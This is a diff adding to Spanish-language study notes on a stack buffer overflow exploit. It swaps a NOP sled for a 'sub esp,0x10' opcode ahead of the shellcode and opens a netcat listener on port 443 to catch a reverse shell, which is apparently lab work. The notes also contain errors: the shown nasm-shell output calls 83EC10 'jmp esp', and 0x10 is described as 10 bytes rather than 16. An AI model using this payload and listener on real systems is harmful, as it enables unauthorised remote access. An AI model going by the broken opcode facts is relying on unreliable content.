@@ -95,4 +95,32 @@ if __name__ == '__main__':
 
 otra forma de hacer lo mismo es hacer un **desplazamiento de pila** para que tarde un poco en llegar a la pila y pueda interpretar el shellcode de manera correcta
 
+ejecutamos nuevamente
+```sh
+/usr/share/metasploit-framework/tools/exploit/nasm-shell.rb
+```
+y luego escribimmos `sub esp,0x10`
+te va  devolver algo como esto
+
+```txt
+08080800    83EC10        jmp esp
+```
+esto decrementa el valor del puntero de la pila 10 bytes
+
+`83EC10` es un OPCode por lo que recordar, no necesita procesarse como Little Endian, pero si como bytes
+
+por lo que reemplazamoes en la variable lo siguiente
+
+```python
+#payload = before_eip + eip + b"\x90"*16 + shellcode
+payload = before_eip + eip + b"\x83\xEC\x10" + shellcode
+```
+
+por lo que ahora de una u otra forma quedaria por ejecutar [[netcat]] usando si quieres [[rlwrap]]
+
+```sh
+rlwrap nc -nlvp 443
+```
+
+y luego ejecutas el exploit.py y tendras la [[Reverse Shell]]
 
